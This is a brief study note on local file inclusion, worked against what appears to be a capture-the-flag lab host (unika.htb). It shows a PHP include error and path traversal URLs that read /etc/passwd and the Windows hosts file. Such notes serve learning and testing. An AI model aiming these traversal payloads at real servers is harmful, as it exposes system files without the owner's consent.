# LFI
https://portswigger.net/web-security/file-path-traversal
https://portswigger.net/kb/issues/00100300_file-path-traversal
## Basic
```
# Take an example URL
http://unika.htb/index.php?page=french.html

# I suspect parameter page is vulnerable to LFI.
# Requesting below URL URL results ine error
http://unika.htb/index.php?page=/french.html
Error: Warning: include(/french.html): Failed to open stream: No such file or directory in C:\xampp\htdocs\index.php on line 11

# I will try the following (Linux web server)
http://unika.htb/index.php?page=../../../etc/passwd
http://unika.htb/index.php?page=/etc/passwd

# On Windows web server
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
http://unika.htb/index.php?page=/windows/system32/drivers/etc/hosts
```
